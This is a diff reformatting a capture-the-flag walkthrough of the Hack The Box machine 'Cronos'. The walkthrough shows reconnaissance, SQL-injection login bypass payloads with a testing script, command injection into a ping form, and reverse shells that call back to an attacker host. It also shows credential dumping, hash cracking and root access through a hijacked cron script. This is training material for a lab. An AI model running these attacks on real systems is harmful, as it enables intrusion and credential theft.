@@ -27,8 +27,7 @@ Cronos is the box on deck this time!
 
 Run nmap and get a list of the ports.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.13 
 [sudo] password for kali: 
@@ -62,14 +61,13 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 16.45 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run nmap against all the ports to find any non-standard services.
 
-{% raw %}
-```sh
+{% capture nmapfull %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.13 
 [sudo] password for kali: 
@@ -83,14 +81,13 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 9.09 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmapfull %}
 
 <br />
 Run curl to see if there is any interesting information in the headers.
 
-{% raw %}
-```sh
+{% capture curli %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ curl -I http://10.10.10.13
 HTTP/1.1 200 OK
@@ -102,16 +99,18 @@ Accept-Ranges: bytes
 Content-Length: 11439
 Vary: Accept-Encoding
 Content-Type: text/html
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curli %}
 
 <br />
 Try adding cronos.htb to the /etc/hosts file.  Cronos is the name of the box and name.htb is a common convention.  Good enough to give it a try.
 
-{% raw %}
-```sh
+{% capture catetchosts %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
-└─$ cat /etc/hosts              
+└─$ cat /etc/hosts
+{% endcapture %}
+
+{% capture etchosts %}
 127.0.0.1       localhost
 127.0.1.1       kali
 10.10.10.13     cronos.htb
@@ -121,8 +120,11 @@ Try adding cronos.htb to the /etc/hosts file.  Cronos is the name of the box and
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catetchosts %}
+
+{% include codebox.html title="/etc/hosts" content=etchosts %}
 
 <br />
 Check the landing page that is being served on port 80.  Cronos.htb seems to get a different result than the Apache page.
@@ -136,10 +138,7 @@ Check the landing page that is being served on port 80.  Cronos.htb seems to get
 <br />
 Check the source code for the port 80 landing page.
 
-{% raw %}
-```html
-view-source:http://cronos.htb/
-
+{% capture landingsource %}
 <!DOCTYPE html>
 <html lang="en">
     <head>
@@ -178,26 +177,22 @@ view-source:http://cronos.htb/
         </div>
     </body>
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://cronos.htb/' content=landingsource %}
 
 <br />
 Check the robots.txt file for any potential juicy information.
 
-{% raw %}
-```html
-http://cronos.htb/robots.txt
-
+{% capture robotstxt %}
 User-agent: *
 Disallow:
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='http://cronos.htb/robots.txt' content=robotstxt %}
 
 <br />
 Ffuf port 80 to try and find any directories or files that might be interesting to review.
 
-{% raw %}
-```bash
+{% capture ffufdir %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://cronos.htb/FUZZ -e .txt,.bak,.html,.php -fw 990
 
@@ -232,14 +227,13 @@ robots.txt              [Status: 200, Size: 24, Words: 2, Lines: 3, Duration: 12
 .php                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 16ms]
 server-status           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 19ms]
 :: Progress: [1102795/1102795] :: Job [1/1] :: 1960 req/sec :: Duration: [0:08:56] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffufdir %}
 
 <br />
 Ffuf for subdomains.
 
-{% raw %}
-```bash
+{% capture ffufsub %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cronos.htb -H "Host: FUZZ.cronos.htb" -fw 3534
 
@@ -268,16 +262,18 @@ ________________________________________________
 www                     [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 37ms]
 admin                   [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 2919ms]
 :: Progress: [114441/114441] :: Job [1/1] :: 847 req/sec :: Duration: [0:02:25] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffufsub %}
 
 <br />
 Add the new subdomain findings to the /etc/hosts file.
 
-{% raw %}
-```bash
+{% capture catupdhosts %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ cat /etc/hosts
+{% endcapture %}
+
+{% capture updhosts %}
 127.0.0.1       localhost
 127.0.1.1       kali
 10.10.10.13     cronos.htb www.cronos.htb admin.cronos.htb
@@ -287,8 +283,11 @@ Add the new subdomain findings to the /etc/hosts file.
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catupdhosts %}
+
+{% include codebox.html title="/etc/hosts" content=updhosts %}
 
 <br />
 Check the admin.cronos.htb page to see what it is.
@@ -302,8 +301,7 @@ Check the admin.cronos.htb page to see what it is.
 <br />
 Check the source code for the admin page.  Maybe we can get lucky with a comment.
 
-{% raw %}
-```bash
+{% capture adminsource %}
 <html>
    
    <head>
@@ -360,8 +358,8 @@ Check the source code for the admin page.  Maybe we can get lucky with a comment
       </div>
    </body>
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='http://admin.cronos.htb' content=adminsource %}
 
 <br />
 Try logging in to see what happens.
@@ -381,8 +379,7 @@ Get the POST request from the dev tools.  If you didn't have them open, open the
     </div>
 </div>
 
-{% raw %}
-```bash
+{% capture loginpost %}
 POST / HTTP/1.1
 Host: admin.cronos.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -399,14 +396,13 @@ Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 
 username=admin&password=admin
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=loginpost %}
 
 <br />
 Ffuf the new admin subdomain.  Maybe we can find some kind of creds file.  Worth a shot.
 
-{% raw %}
-```bash
+{% capture ffufsub %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://admin.cronos.htb/FUZZ -e .txt,.bak,.html,.php -fw 525
 
@@ -442,23 +438,42 @@ session.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 21m
 .php                    [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 13ms]
 server-status           [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 13ms]
 :: Progress: [1102795/1102795] :: Job [1/1] :: 1739 req/sec :: Duration: [0:06:47] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffufsub %}
 
 <br />
 Create a payloads list the concatenate the two authentication bypass lists from PayloadAllTheThings.
 
-{% raw %}
-```bash
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass2.txt
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt
-```
-{% endraw %}
+{% capture bypass1 %}
+'-'
+' '
+'&'
+'^'
+'*'
 
-{% raw %}
-```bash
+<snip>
+
+{% endcapture %}
+{% include terminal.html language='browser' title='https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt' content=bypass1 %}
+
+{% capture bypass2 %}
+==
+=
+'
+' --
+' #
+
+<snip>
+
+{% endcapture %}
+{% include terminal.html language='browser' title='https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass2.txt' content=bypass2 %}
+
+{% capture catpayloads %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ cat payloads.txt 
+{% endcapture %}
+
+{% capture payloadstxt %}
 '-'
 ' '
 '&'
@@ -470,14 +485,17 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/
 ' or ''^'
 
 <snip>
-```
-{% endraw %}
+
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catpayloads %}
+
+{% include codebox.html title="payload.txt" content=payloadstxt %}
 
 <br />
 Create a python the test the two fields with the payload list that was just created.
 
-{% raw %}
-```python
+{% capture testfieldsscript %}
 import requests
 
 check = 'invalid'
@@ -504,14 +522,13 @@ with open('/home/kali/Documents/htb/cronos/payloads.txt','r') as fs:
 
         
 print('Fin')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='sqli.py' content=testfieldsscript %}
 
 <br />
 Run the script to see valid payloads.
 
-{% raw %}
-```python
+{% capture validatepayloads %}
 ========== RESTART: /home/kali/Documents/htb/cronos/htb-cronos_0x00.py =========
 username -> admin' #
 username -> admin' or '1'='1
@@ -521,8 +538,8 @@ username -> admin' or 1=1#
 username -> 1' or 1.e(1) or '1'='1
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=validatepayloads %}
 
 <br />
 Test the first payload, admin' #.
@@ -536,8 +553,7 @@ Test the first payload, admin' #.
 <br />
 Test the Traceroute functionality.  View the request.
 
-{% raw %}
-```bash
+{% capture testtrace %}
 POST /welcome.php HTTP/1.1
 Host: admin.cronos.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -554,8 +570,8 @@ Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 
 command=traceroute&host=10.10.16.12
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=testtrace %}
 
 <br />
 Test the ping functionality to see what it does.
@@ -566,8 +582,7 @@ Test the ping functionality to see what it does.
     </div>
 </div>
 
-{% raw %}
-```bash
+{% capture pingtest %}
 POST /welcome.php HTTP/1.1
 Host: admin.cronos.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -584,8 +599,8 @@ Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 
 command=ping+-c+1&host=10.10.16.12
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=pingtest %}
 
 <br />
 Try using ; to try and inject a second command.  We will use id as an introductory test.
@@ -599,13 +614,12 @@ Try using ; to try and inject a second command.  We will use id as an introducto
 <br />
 Start a listener.
 
-{% raw %}
-```bash
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ nc -nlvp 4444     
 listening on [any] 4444 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startlistener %}
 
 <br />
 Use revshells to get a python one-liner.
@@ -629,8 +643,7 @@ Inject the payload into the vulnerable ping command.
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ nc -nlvp 4444     
 listening on [any] 4444 ...
@@ -638,14 +651,13 @@ connect to [10.10.16.12] from (UNKNOWN) [10.10.10.13] 59340
 $ python -c 'import pty; pty.spawn("/bin/bash");'
 python -c 'import pty; pty.spawn("/bin/bash");'
 www-data@cronos:/var/www/admin$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchshell %}
 
 <br />
 Check the config.php file.  There are usually the database credentials in there.
 
-{% raw %}
-```php
+{% capture checkconfig %}
 <?php
    define('DB_SERVER', 'localhost');
    define('DB_USERNAME', 'admin');
@@ -653,16 +665,18 @@ Check the config.php file.  There are usually the database credentials in there.
    define('DB_DATABASE', 'admin');
    $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
 ?>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='php' title='config.php' content=checkconfig %}
 
 <br />
 Get the /etc/passwd file to check out the system user.
 
-{% raw %}
-```bash
+{% capture catpasswd %}
 www-data@cronos:/var/www/admin$ cat /etc/passwd
 cat /etc/passwd
+{% endcapture %}
+
+{% capture etcpasswd %}
 root:x:0:0:root:/root:/bin/bash
 
 <snip>
@@ -671,14 +685,16 @@ dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
 sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
 noulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash
 bind:x:112:119::/var/cache/bind:/bin/false
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catpasswd %}
+
+{% include codebox.html title="/etc/passwd" content=etcpasswd %}
 
 <br />
 Login into mysql using the credentials from the conf.php.
 
-{% raw %}
-```bash
+{% capture logintomysql %}
 mysql -u admin -p
 Enter password: kEjdbRigfBHUREiNSDs
 
@@ -695,14 +711,13 @@ owners.
 Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
 mysql>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=logintomysql %}
 
 <br />
 Look into the available databases and change into the admin database.
 
-{% raw %}
-```bash
+{% capture showdatabases %}
 mysql> show databases;
 show databases;
 +--------------------+
@@ -719,14 +734,13 @@ Reading table information for completion of table and column names
 You can turn off this feature to get a quicker startup with -A
 
 Database changed
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=showdatabases %}
 
 <br />
 Show the tables available in the admin database.
 
-{% raw %}
-```bash
+{% capture showtables %}
 mysql> show tables;
 show tables;
 +-----------------+
@@ -735,14 +749,13 @@ show tables;
 | users           |
 +-----------------+
 1 row in set (0.00 sec)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=showtables %}
 
 <br />
 Dump the table.
 
-{% raw %}
-```bash
+{% capture dumpusertable %}
 mysql> select * from users;
 select * from users;
 +----+----------+----------------------------------+
@@ -751,14 +764,13 @@ select * from users;
 |  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
 +----+----------+----------------------------------+
 1 row in set (0.00 sec)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=dumpusertable %}
 
 <br />
 Run that hash through hash-identifier to identify the type of hash.
 
-{% raw %}
-```bash
+{% capture identifyhash %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ hash-identifier                                      
    #########################################################################
@@ -781,14 +793,13 @@ Possible Hashs:
 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=identifyhash %}
 
 <br />
 Use john the ripper to try and crack the password.
 
-{% raw %}
-```bash
+{% capture johncrack %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt
 Using default input encoding: UTF-8
@@ -797,14 +808,13 @@ Warning: no OpenMP support for this hash type, consider --fork=4
 Press 'q' or Ctrl-C to abort, almost any other key for status
 0g 0:00:00:01 DONE (2025-02-15 23:44) 0g/s 14062Kp/s 14062Kc/s 14062KC/s  fuckyooh21..*7¡Vamos!
 Session completed.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=johncrack %}
 
 <br />
 Download linpeas.sh to the local working folder.
 
-{% raw %}
-```bash
+{% capture downloadpeas %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250202-a3a1123d/linpeas.sh
 --2025-02-16 00:01:37--  https://github.com/peass-ng/PEASS-ng/releases/download/20250202-a3a1123d/linpeas.sh
@@ -827,14 +837,13 @@ linpeas.sh                                                 100%[================
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ python3 -m http.server          
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpeas %}
 
 <br />
 Transfer the peas to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferpeas %}
 www-data@cronos:/dev/shm$ wget 10.10.16.12:8000/linpeas.sh
 wget 10.10.16.12:8000/linpeas.sh
 --2025-02-15 15:07:45--  http://10.10.16.12:8000/linpeas.sh
@@ -849,14 +858,13 @@ linpeas.sh          100%[===================>] 820.23K  1.12MB/s    in 0.7s
 
 www-data@cronos:/dev/shm$ chmod +x linpeas.sh
 chmod +x linpeas.sh
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferpeas %}
 
 <br />
 Run the mighty peas script and notice the file called /var/www/laravel/artisan file in the cron jobs section.
 
-{% raw %}
-```bash
+{% capture checkthepeas %}
 www-data@cronos:/dev/shm$ ./linpeas.sh
 ./linpeas.sh
 
@@ -869,14 +877,13 @@ www-data@cronos:/dev/shm$ ./linpeas.sh
 * * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=checkthepeas %}
 
 <br />
 Check the permissions of this file.
 
-{% raw %}
-```bash
+{% capture listlaravelcontents %}
 www-data@cronos:/var/www/laravel$ ls -la
 ls -la
 total 2012
@@ -891,14 +898,14 @@ drwxr-xr-x  6 www-data www-data    4096 May 10  2022 app
 -rwxr-xr-x  1 www-data www-data    1646 Apr  9  2017 artisan
 
 <snip>
-```
-{% endraw %}
+
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=listlaravelcontents %}
 
 <br />
 Download the pentestmonkey php reverse shell file.
 
-{% raw %}
-```bash
+{% capture downloadpentestmonkey %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$  wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O artisan
 --2025-02-16 00:28:45--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
@@ -916,14 +923,13 @@ artisan                                                    100%[================
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpentestmonkey %}
 
 <br />
 Update the lhost ip address to the ip address of the tun0 interface.
 
-{% raw %}
-```php
+{% capture updatemonkey %}
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
@@ -947,25 +953,24 @@ $daemon = 0;
 $debug = 0;
 
 <snip>
-```
-{% endraw %}
+
+{% endcapture %}
+{% include terminal.html language='php' title='php' content=updatemonkey %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ nc -nlvp 1234 
 listening on [any] 1234 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startlistener %}
 
 <br />
 Transfer the new pentest monkey artisan file to the victim machine.
 
-{% raw %}
-```bash
+{% capture transfermonkey %}
 www-data@cronos:/dev/shm$ wget 10.10.16.12:8000/artisan
 wget 10.10.16.12:8000/artisan
 --2025-02-15 15:32:55--  http://10.10.16.12:8000/artisan
@@ -980,24 +985,22 @@ artisan             100%[===================>]   5.36K  --.-KB/s    in 0.004s
 
 www-data@cronos:/dev/shm$ chmod +x artisan
 chmod +x artisan
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transfermonkey %}
 
 <br />
 Overwrite the file in /var/www/laravel file with our malicious file.
 
-{% raw %}
-```bash
+{% capture overwriteartisan %}
 www-data@cronos:/dev/shm$ cp artisan /var/www/laravel/artisan
 cp artisan /var/www/laravel/artisan
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=overwriteartisan %}
 
 <br />
 Give it some time for the cron job to execute.  Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchrootshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/cronos]
 └─$ nc -nlvp 1234 
 listening on [any] 1234 ...
@@ -1008,14 +1011,13 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=0(root) gid=0(root) groups=0(root)
 /bin/sh: 0: can't access tty; job control turned off
 #
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchrootshell %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 # cat /home/noulis/user.txt
 <redacted>
 # ifconfig
@@ -1037,14 +1039,13 @@ lo        Link encap:Local Loopback
           TX packets:5458 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1 
           RX bytes:535953 (535.9 KB)  TX bytes:535953 (535.9 KB)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 # cat /root/root.txt 
 <redacted>
 # ifconfig
@@ -1066,8 +1067,8 @@ lo        Link encap:Local Loopback
           TX packets:5458 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1 
           RX bytes:535953 (535.9 KB)  TX bytes:535953 (535.9 KB)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 And thanks to the mighty linpeas, we were able to wrap this one up.  See in the next one.
